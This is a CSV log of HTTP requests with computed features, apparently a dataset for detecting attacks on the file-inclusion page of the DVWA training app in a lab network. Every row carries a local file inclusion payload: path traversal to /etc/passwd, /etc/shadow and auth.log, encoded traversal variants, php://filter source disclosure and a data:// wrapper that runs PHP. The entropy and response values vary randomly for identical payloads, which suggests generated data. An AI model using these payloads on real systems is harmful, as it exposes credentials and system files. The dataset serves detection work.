timestamp,client_ip,method,url,path,body,body_len,body_entropy,special_char_count,path_depth,query_length,has_file_upload,response_status,response_length
2025-12-24T07:39:16Z,"('127.0.0.1', 35990)",GET,"http://192.168.122.170/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php phpinfo();?>",/dvwa/vulnerabilities/fi/,"data://text/plain,<?php phpinfo();?>",36,3.977,13,4,36,0,200,3099
2025-12-24T07:39:22Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../var/log/auth.log,/dvwa/vulnerabilities/fi/,../../../../var/log/auth.log,28,4.841,15,4,28,0,200,1229
2025-12-24T07:39:28Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=/proc/self/environ,/dvwa/vulnerabilities/fi/,/proc/self/environ,18,5.269,3,4,18,0,200,1715
2025-12-24T07:39:34Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../var/log/auth.log,/dvwa/vulnerabilities/fi/,../../../../var/log/auth.log,28,5.694,15,4,28,0,500,2208
2025-12-24T07:39:40Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=/proc/self/environ,/dvwa/vulnerabilities/fi/,/proc/self/environ,18,4.164,3,4,18,0,500,404
2025-12-24T07:39:46Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=/proc/self/environ,/dvwa/vulnerabilities/fi/,/proc/self/environ,18,5.372,3,4,18,0,403,2475
2025-12-24T07:39:52Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../etc/shadow,/dvwa/vulnerabilities/fi/,../../../etc/shadow,19,4.615,10,4,19,0,200,600
2025-12-24T07:39:58Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,5.593,9,4,53,0,403,4412
2025-12-24T07:40:04Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd,/dvwa/vulnerabilities/fi/,../../../../etc/passwd,22,4.069,13,4,22,0,200,3123
2025-12-24T07:40:10Z,"('127.0.0.1', 35990)",GET,"http://192.168.122.170/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php phpinfo();?>",/dvwa/vulnerabilities/fi/,"data://text/plain,<?php phpinfo();?>",36,5.678,13,4,36,0,200,332
2025-12-24T07:40:16Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd,/dvwa/vulnerabilities/fi/,../../../../etc/passwd,22,4.647,13,4,22,0,403,4078
2025-12-24T07:40:22Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,5.57,9,4,53,0,500,4512
2025-12-24T07:40:28Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../var/log/auth.log,/dvwa/vulnerabilities/fi/,../../../../var/log/auth.log,28,5.852,15,4,28,0,500,1635
2025-12-24T07:40:34Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../proc/version,/dvwa/vulnerabilities/fi/,../../../../proc/version,24,4.411,13,4,24,0,403,2920
2025-12-24T07:40:40Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../var/log/auth.log,/dvwa/vulnerabilities/fi/,../../../../var/log/auth.log,28,3.74,15,4,28,0,200,2493
2025-12-24T07:40:46Z,"('127.0.0.1', 35990)",GET,"http://192.168.122.170/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php phpinfo();?>",/dvwa/vulnerabilities/fi/,"data://text/plain,<?php phpinfo();?>",36,4.007,13,4,36,0,403,3066
2025-12-24T07:40:52Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,3.87,9,4,53,0,403,545
2025-12-24T07:40:58Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,5.759,9,4,53,0,200,581
2025-12-24T07:41:04Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=/proc/self/environ,/dvwa/vulnerabilities/fi/,/proc/self/environ,18,4.001,3,4,18,0,200,1798
2025-12-24T07:41:10Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2fetc%2fpasswd,/dvwa/vulnerabilities/fi/,..%2f..%2f..%2fetc%2fpasswd,27,4.722,10,4,27,0,403,2151
2025-12-24T07:41:16Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../var/log/auth.log,/dvwa/vulnerabilities/fi/,../../../../var/log/auth.log,28,3.955,15,4,28,0,500,2909
2025-12-24T07:41:22Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,5.644,9,4,53,0,200,1723
2025-12-24T07:41:28Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=/proc/self/environ,/dvwa/vulnerabilities/fi/,/proc/self/environ,18,4.167,3,4,18,0,403,4206
2025-12-24T07:41:34Z,"('127.0.0.1', 35990)",GET,"http://192.168.122.170/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php phpinfo();?>",/dvwa/vulnerabilities/fi/,"data://text/plain,<?php phpinfo();?>",36,4.198,13,4,36,0,500,3656
2025-12-24T07:41:40Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../etc/shadow,/dvwa/vulnerabilities/fi/,../../../etc/shadow,19,3.679,10,4,19,0,200,3280
2025-12-24T07:41:46Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2fetc%2fpasswd,/dvwa/vulnerabilities/fi/,..%2f..%2f..%2fetc%2fpasswd,27,4.342,10,4,27,0,200,3312
2025-12-24T07:41:52Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd,/dvwa/vulnerabilities/fi/,../../../../etc/passwd,22,4.4,13,4,22,0,200,2404
2025-12-24T07:41:58Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=/proc/self/environ,/dvwa/vulnerabilities/fi/,/proc/self/environ,18,4.998,3,4,18,0,403,1730
2025-12-24T07:42:04Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=/proc/self/environ,/dvwa/vulnerabilities/fi/,/proc/self/environ,18,5.23,3,4,18,0,500,1384
2025-12-24T07:42:10Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../var/log/auth.log,/dvwa/vulnerabilities/fi/,../../../../var/log/auth.log,28,5.658,15,4,28,0,500,1546
2025-12-24T07:42:16Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=/proc/self/environ,/dvwa/vulnerabilities/fi/,/proc/self/environ,18,5.692,3,4,18,0,403,4760
2025-12-24T07:42:22Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2fetc%2fpasswd,/dvwa/vulnerabilities/fi/,..%2f..%2f..%2fetc%2fpasswd,27,4.956,10,4,27,0,403,951
2025-12-24T07:42:28Z,"('127.0.0.1', 35990)",GET,"http://192.168.122.170/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php phpinfo();?>",/dvwa/vulnerabilities/fi/,"data://text/plain,<?php phpinfo();?>",36,4.55,13,4,36,0,403,1673
2025-12-24T07:42:34Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2fetc%2fpasswd,/dvwa/vulnerabilities/fi/,..%2f..%2f..%2fetc%2fpasswd,27,4.767,10,4,27,0,200,1167
2025-12-24T07:42:40Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../proc/version,/dvwa/vulnerabilities/fi/,../../../../proc/version,24,4.327,13,4,24,0,500,1739
2025-12-24T07:42:46Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../proc/version,/dvwa/vulnerabilities/fi/,../../../../proc/version,24,4.161,13,4,24,0,500,936
2025-12-24T07:42:52Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../etc/shadow,/dvwa/vulnerabilities/fi/,../../../etc/shadow,19,5.359,10,4,19,0,500,3585
2025-12-24T07:42:58Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2fetc%2fpasswd,/dvwa/vulnerabilities/fi/,..%2f..%2f..%2fetc%2fpasswd,27,5.495,10,4,27,0,200,2352
2025-12-24T07:43:04Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%252f..%252f..%252fetc%252fpasswd,/dvwa/vulnerabilities/fi/,..%252f..%252f..%252fetc%252fpasswd,35,5.736,10,4,35,0,200,2456
2025-12-24T07:43:10Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../var/log/auth.log,/dvwa/vulnerabilities/fi/,../../../../var/log/auth.log,28,4.367,15,4,28,0,500,263
2025-12-24T07:43:16Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2fetc%2fpasswd,/dvwa/vulnerabilities/fi/,..%2f..%2f..%2fetc%2fpasswd,27,5.347,10,4,27,0,403,4316
2025-12-24T07:43:22Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,4.451,9,4,53,0,403,1619
2025-12-24T07:43:28Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2fetc%2fpasswd,/dvwa/vulnerabilities/fi/,..%2f..%2f..%2fetc%2fpasswd,27,3.839,10,4,27,0,403,4034
2025-12-24T07:43:34Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=/proc/self/environ,/dvwa/vulnerabilities/fi/,/proc/self/environ,18,4.524,3,4,18,0,500,3913
2025-12-24T07:43:40Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd,/dvwa/vulnerabilities/fi/,../../../../etc/passwd,22,5.215,13,4,22,0,403,3457
2025-12-24T07:43:46Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../proc/version,/dvwa/vulnerabilities/fi/,../../../../proc/version,24,5.686,13,4,24,0,403,3129
2025-12-24T07:43:52Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd,/dvwa/vulnerabilities/fi/,../../../../etc/passwd,22,5.704,13,4,22,0,200,3083
2025-12-24T07:43:58Z,"('127.0.0.1', 35990)",GET,"http://192.168.122.170/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php phpinfo();?>",/dvwa/vulnerabilities/fi/,"data://text/plain,<?php phpinfo();?>",36,5.776,13,4,36,0,403,1996
2025-12-24T07:44:04Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../etc/shadow,/dvwa/vulnerabilities/fi/,../../../etc/shadow,19,4.108,10,4,19,0,403,4058
2025-12-24T07:44:10Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,4.163,9,4,53,0,403,1677
2025-12-24T07:44:16Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,5.748,9,4,53,0,500,4711
2025-12-24T07:44:22Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=/proc/self/environ,/dvwa/vulnerabilities/fi/,/proc/self/environ,18,3.974,3,4,18,0,200,1259
2025-12-24T07:44:28Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%252f..%252f..%252fetc%252fpasswd,/dvwa/vulnerabilities/fi/,..%252f..%252f..%252fetc%252fpasswd,35,5.794,10,4,35,0,500,776
2025-12-24T07:44:34Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2fetc%2fpasswd,/dvwa/vulnerabilities/fi/,..%2f..%2f..%2fetc%2fpasswd,27,4.002,10,4,27,0,500,824
2025-12-24T07:44:40Z,"('127.0.0.1', 35990)",GET,"http://192.168.122.170/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php phpinfo();?>",/dvwa/vulnerabilities/fi/,"data://text/plain,<?php phpinfo();?>",36,4.958,13,4,36,0,403,4448
2025-12-24T07:44:46Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd,/dvwa/vulnerabilities/fi/,../../../../etc/passwd,22,5.902,13,4,22,0,403,1825
2025-12-24T07:44:52Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd,/dvwa/vulnerabilities/fi/,../../../../etc/passwd,22,4.699,13,4,22,0,500,1417
2025-12-24T07:44:58Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../proc/version,/dvwa/vulnerabilities/fi/,../../../../proc/version,24,3.648,13,4,24,0,500,881
2025-12-24T07:45:04Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2fetc%2fpasswd,/dvwa/vulnerabilities/fi/,..%2f..%2f..%2fetc%2fpasswd,27,5.544,10,4,27,0,200,1680
2025-12-24T07:45:10Z,"('127.0.0.1', 35990)",GET,"http://192.168.122.170/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php phpinfo();?>",/dvwa/vulnerabilities/fi/,"data://text/plain,<?php phpinfo();?>",36,4.204,13,4,36,0,500,3268
2025-12-24T07:45:16Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../proc/version,/dvwa/vulnerabilities/fi/,../../../../proc/version,24,4.986,13,4,24,0,200,1821
2025-12-24T07:45:22Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,3.727,9,4,53,0,200,595
2025-12-24T07:45:28Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2fetc%2fpasswd,/dvwa/vulnerabilities/fi/,..%2f..%2f..%2fetc%2fpasswd,27,4.26,10,4,27,0,200,3269
2025-12-24T07:45:34Z,"('127.0.0.1', 35990)",GET,"http://192.168.122.170/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php phpinfo();?>",/dvwa/vulnerabilities/fi/,"data://text/plain,<?php phpinfo();?>",36,5.28,13,4,36,0,403,594
2025-12-24T07:45:40Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%252f..%252f..%252fetc%252fpasswd,/dvwa/vulnerabilities/fi/,..%252f..%252f..%252fetc%252fpasswd,35,5.787,10,4,35,0,403,2666
2025-12-24T07:45:46Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,4.145,9,4,53,0,500,3244
2025-12-24T07:45:52Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,3.655,9,4,53,0,200,2626
2025-12-24T07:45:58Z,"('127.0.0.1', 35990)",GET,"http://192.168.122.170/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php phpinfo();?>",/dvwa/vulnerabilities/fi/,"data://text/plain,<?php phpinfo();?>",36,3.864,13,4,36,0,403,4553
2025-12-24T07:46:04Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2fetc%2fpasswd,/dvwa/vulnerabilities/fi/,..%2f..%2f..%2fetc%2fpasswd,27,5.059,10,4,27,0,403,3135
2025-12-24T07:46:10Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../etc/shadow,/dvwa/vulnerabilities/fi/,../../../etc/shadow,19,5.984,10,4,19,0,200,2134
2025-12-24T07:46:16Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%252f..%252f..%252fetc%252fpasswd,/dvwa/vulnerabilities/fi/,..%252f..%252f..%252fetc%252fpasswd,35,4.588,10,4,35,0,500,4026
2025-12-24T07:46:22Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../etc/shadow,/dvwa/vulnerabilities/fi/,../../../etc/shadow,19,4.36,10,4,19,0,500,613
2025-12-24T07:46:28Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,3.865,9,4,53,0,500,3319
2025-12-24T07:46:34Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2fetc%2fpasswd,/dvwa/vulnerabilities/fi/,..%2f..%2f..%2fetc%2fpasswd,27,5.64,10,4,27,0,500,4425
2025-12-24T07:46:40Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../proc/version,/dvwa/vulnerabilities/fi/,../../../../proc/version,24,5.82,13,4,24,0,500,1816
2025-12-24T07:46:46Z,"('127.0.0.1', 35990)",GET,"http://192.168.122.170/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php phpinfo();?>",/dvwa/vulnerabilities/fi/,"data://text/plain,<?php phpinfo();?>",36,3.844,13,4,36,0,403,2928
2025-12-24T07:46:52Z,"('127.0.0.1', 35990)",GET,"http://192.168.122.170/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php phpinfo();?>",/dvwa/vulnerabilities/fi/,"data://text/plain,<?php phpinfo();?>",36,5.6,13,4,36,0,403,3089
2025-12-24T07:46:58Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../proc/version,/dvwa/vulnerabilities/fi/,../../../../proc/version,24,4.428,13,4,24,0,403,4460
2025-12-24T07:47:04Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../var/log/auth.log,/dvwa/vulnerabilities/fi/,../../../../var/log/auth.log,28,5.025,15,4,28,0,500,489
2025-12-24T07:47:10Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../var/log/auth.log,/dvwa/vulnerabilities/fi/,../../../../var/log/auth.log,28,4.36,15,4,28,0,500,4316
2025-12-24T07:47:16Z,"('127.0.0.1', 35990)",GET,"http://192.168.122.170/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php phpinfo();?>",/dvwa/vulnerabilities/fi/,"data://text/plain,<?php phpinfo();?>",36,4.999,13,4,36,0,500,4417
2025-12-24T07:47:22Z,"('127.0.0.1', 35990)",GET,"http://192.168.122.170/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php phpinfo();?>",/dvwa/vulnerabilities/fi/,"data://text/plain,<?php phpinfo();?>",36,5.012,13,4,36,0,500,1349
2025-12-24T07:47:28Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../proc/version,/dvwa/vulnerabilities/fi/,../../../../proc/version,24,3.846,13,4,24,0,403,2738
2025-12-24T07:47:34Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2fetc%2fpasswd,/dvwa/vulnerabilities/fi/,..%2f..%2f..%2fetc%2fpasswd,27,3.912,10,4,27,0,200,1550
2025-12-24T07:47:40Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2fetc%2fpasswd,/dvwa/vulnerabilities/fi/,..%2f..%2f..%2fetc%2fpasswd,27,5.121,10,4,27,0,500,3034
2025-12-24T07:47:46Z,"('127.0.0.1', 35990)",GET,"http://192.168.122.170/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php phpinfo();?>",/dvwa/vulnerabilities/fi/,"data://text/plain,<?php phpinfo();?>",36,3.937,13,4,36,0,200,3949
2025-12-24T07:47:52Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../etc/shadow,/dvwa/vulnerabilities/fi/,../../../etc/shadow,19,4.091,10,4,19,0,500,4526
2025-12-24T07:47:58Z,"('127.0.0.1', 35990)",GET,"http://192.168.122.170/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php phpinfo();?>",/dvwa/vulnerabilities/fi/,"data://text/plain,<?php phpinfo();?>",36,5.702,13,4,36,0,403,3937
2025-12-24T07:48:04Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd,/dvwa/vulnerabilities/fi/,../../../../etc/passwd,22,4.376,13,4,22,0,500,1462
2025-12-24T07:48:10Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../etc/shadow,/dvwa/vulnerabilities/fi/,../../../etc/shadow,19,3.854,10,4,19,0,500,802
2025-12-24T07:48:16Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../proc/version,/dvwa/vulnerabilities/fi/,../../../../proc/version,24,4.98,13,4,24,0,200,2519
2025-12-24T07:48:22Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,4.139,9,4,53,0,200,263
2025-12-24T07:48:28Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../var/log/auth.log,/dvwa/vulnerabilities/fi/,../../../../var/log/auth.log,28,4.996,15,4,28,0,403,4018
2025-12-24T07:48:34Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,4.536,9,4,53,0,500,1744
2025-12-24T07:48:40Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../var/log/auth.log,/dvwa/vulnerabilities/fi/,../../../../var/log/auth.log,28,4.833,15,4,28,0,200,2771
2025-12-24T07:48:46Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../var/log/auth.log,/dvwa/vulnerabilities/fi/,../../../../var/log/auth.log,28,4.292,15,4,28,0,200,2107
2025-12-24T07:48:52Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../proc/version,/dvwa/vulnerabilities/fi/,../../../../proc/version,24,5.853,13,4,24,0,200,3567
2025-12-24T07:48:58Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../etc/shadow,/dvwa/vulnerabilities/fi/,../../../etc/shadow,19,5.799,10,4,19,0,403,3403
2025-12-24T07:49:04Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,5.444,9,4,53,0,500,1030
2025-12-24T07:49:10Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,5.556,9,4,53,0,403,4790
2025-12-24T07:49:16Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2fetc%2fpasswd,/dvwa/vulnerabilities/fi/,..%2f..%2f..%2fetc%2fpasswd,27,5.378,10,4,27,0,500,4373
2025-12-24T07:49:22Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../etc/shadow,/dvwa/vulnerabilities/fi/,../../../etc/shadow,19,3.871,10,4,19,0,500,1175
2025-12-24T07:49:28Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=/proc/self/environ,/dvwa/vulnerabilities/fi/,/proc/self/environ,18,5.218,3,4,18,0,500,921
2025-12-24T07:49:34Z,"('127.0.0.1', 35990)",GET,"http://192.168.122.170/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php phpinfo();?>",/dvwa/vulnerabilities/fi/,"data://text/plain,<?php phpinfo();?>",36,5.3,13,4,36,0,200,1025
2025-12-24T07:49:40Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,5.87,9,4,53,0,403,2345
2025-12-24T07:49:46Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2fetc%2fpasswd,/dvwa/vulnerabilities/fi/,..%2f..%2f..%2fetc%2fpasswd,27,4.791,10,4,27,0,403,657
